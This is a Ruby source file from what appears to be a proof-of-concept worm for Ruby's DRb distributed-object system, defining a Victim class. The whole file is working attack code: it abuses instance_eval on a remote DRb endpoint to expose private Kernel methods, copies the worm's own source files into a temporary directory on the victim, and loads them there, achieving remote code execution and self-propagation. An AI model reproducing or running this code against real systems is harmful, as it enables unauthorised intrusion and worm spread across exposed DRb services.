require 'pathname'

##
# This class gives the host the ability to interact with a victim DRb process.
#
# Example:
#
#   victim = DRb::Worm::Victim.new "druby://victim.example:12345"
#   victim.infect

class DRb::Worm::Victim

  ##
  # The URI of the victim DRb process

  attr_reader :uri

  ##
  # Creates a new victim wrapper for +uri+

  def initialize uri
    @uri = uri

    @remote_nil = DRb::DRbObject.new_with @uri, 0
    @remote_object = nil
  end

  ##
  # Adds +path+ to the victim's $LOAD_PATH temporarily.

  def add_to_load_path path
    r_LOAD_PATH.unshift path

    yield
  ensure
    r_LOAD_PATH.delete path
  end

  ##
  # Infects the victim with the worm

  def infect
    r_require 'tmpdir'
    r_require 'fileutils'

    inject_files
  end

  ##
  # Injects +filename+ from +local_path+ into the victim relative to
  # +remote_lib+.

  def inject_file filename, local_path, remote_lib
    r_file = File.join remote_lib, filename
    r_FileUtils.mkdir_p File.dirname r_file

    r_open r_file, 'w' do |r_io|
      open local_path do |l_io|
        r_io.write l_io.read
      end
    end
  end

  ##
  # Injects the classes from the local files into the victim

  def inject_files
    r_Dir.mktmpdir do |lib|
      add_to_load_path lib do
        local_files.each do |path, file|
          inject_file file, path, lib
        end

        r_require 'drb/worm'
      end
    end
  end

  ##
  # The local files that make up the worm

  def local_files
    root = Pathname.new __FILE__

    until root.to_s.end_with? 'lib' do
      root = root.parent
    end

    Dir["#{root}/**/*.rb"].map do |path|
      path = Pathname.new path
      [path.to_s, path.relative_path_from(root).to_s]
    end
  end

  ##
  # Dir in the remote object space

  def r_Dir
    r_const_get :Dir
  end

  ##
  # FileUtils in the remote object space

  def r_FileUtils
    r_const_get :FileUtils
  end

  ##
  # $LOAD_PATH in the remote object space

  def r_LOAD_PATH
    remote_object.LOAD_PATH
  end

  ##
  # Retrieves the remote constant +name+ under Object

  def r_const_get name
    const_id = remote_object.const_get_id name

    DRb::DRbObject.new_with @uri, const_id
  end

  ##
  # Kernel#open on the remote object

  def r_open path, mode = nil, &block
    remote_object.open path, mode, &block
  end

  ##
  # Kernel#require on the remote object

  def r_require path
    remote_object.require path
  end

  ##
  # A remote object with various kernel methods marked as private

  def remote_object
    @remote_object ||=
      @remote_nil.method_missing :instance_eval, remote_script
  end

  ##
  # A ruby script that creates a remote undumped object with necessary kernel
  # methods public.

  def remote_script
    script = []
    script << 'o = Object.new'
    script << 'class << o'
    script << 'extend DRb::DRbUndumped'

    methods = Kernel.methods(:false).sort - Kernel.instance_methods

    methods.each do |method|
      script << "public :#{method} rescue nil"
    end

    script << 'end'
    script << 'def o.const_get_id(name) Object.const_get(name).object_id end'
    script << 'def o.LOAD_PATH() DRb::DRbObject.new($LOAD_PATH) end'
    script << 'o'

    script.join "\n"
  end

end

